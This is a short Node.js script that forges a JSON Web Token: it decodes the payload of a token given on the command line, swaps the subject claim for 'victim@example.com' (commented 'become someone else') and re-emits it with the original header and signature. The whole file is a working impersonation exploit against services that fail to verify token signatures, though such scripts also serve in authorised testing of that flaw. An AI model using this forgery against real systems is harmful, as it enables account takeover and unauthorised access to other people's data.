const original = process.argv[2];
const [header, payload, signature] = original.split('.');

const claims = JSON.parse(Buffer.from(payload, 'base64url').toString());
claims.sub = 'victim@example.com';          // become someone else

const forged = Buffer.from(JSON.stringify(claims)).toString('base64url');
console.log(`${header}.${forged}.${signature}`);
